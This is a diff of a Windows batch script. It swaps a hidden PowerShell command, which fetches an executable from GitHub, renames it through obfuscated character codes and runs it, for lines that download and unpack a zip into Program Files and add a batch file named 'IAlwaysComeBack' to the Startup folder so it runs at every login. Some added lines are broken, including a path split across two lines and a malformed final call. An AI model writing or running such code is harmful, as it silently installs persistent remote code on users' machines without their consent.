@@ -1,2 +1,9 @@
 @echo off
-start /min powershell -NoProfile -Command "cd $env:USERPROFILE\Downloads; curl.exe -s -L 'https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/dist/calculator.exe' -o 'abc'; Rename-Item -LiteralPath 'abc' -NewName (-join ([char]99,[char]97,[char]108,[char]99,[char]117,[char]108,[char]97,[char]116,[char]111,[char]114,[char]46,[char]101,[char]120,[char]101)); .\calculator.exe"
+
+cd C:\"Program Files\"
+curl.exe -s -O EatMyShortz.zip "https://raw.githubusercontent.com/MyelinLennox/refs/heads/FunnyCalculator/main/EatMyShortz.zip"
+tar -xf ".\EatMyShortz.zip" -C ".\"
+
+mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMy
+Shortz\IAlwaysComeBack.bat"
+./C:\Program Files\EatMyShortz\IAlwaysComeBack.bat
